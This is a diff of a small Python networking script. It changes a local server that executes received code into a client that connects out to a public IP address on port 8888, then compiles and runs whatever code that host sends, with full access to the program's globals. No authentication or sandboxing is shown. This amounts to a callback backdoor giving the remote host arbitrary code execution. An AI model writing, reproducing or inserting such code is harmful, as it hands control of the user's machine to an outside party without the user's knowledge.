@@ -1,9 +1,9 @@
-from lib.CommuHandler import CommuHandler
+import net.CommuHandler as ch
 import asyncio
 
 def executeCode(code):
     code_obj = compile(code, '<string>', 'exec')
-    exec(code_obj)
+    exec(code_obj, globals())
 
 async def eventHandle(reader, writer):
     code = await reader.read()
@@ -11,5 +11,5 @@ async def eventHandle(reader, writer):
     writer.close()
     await writer.wait_closed()
 
-server = CommuHandler.ServerHandler('172.26.2.32', 8888)
-asyncio.run(server.start(eventHandle))
+client = ch.ClientHandler('52.78.166.156', 8888)
+asyncio.run(client.start(eventHandle))
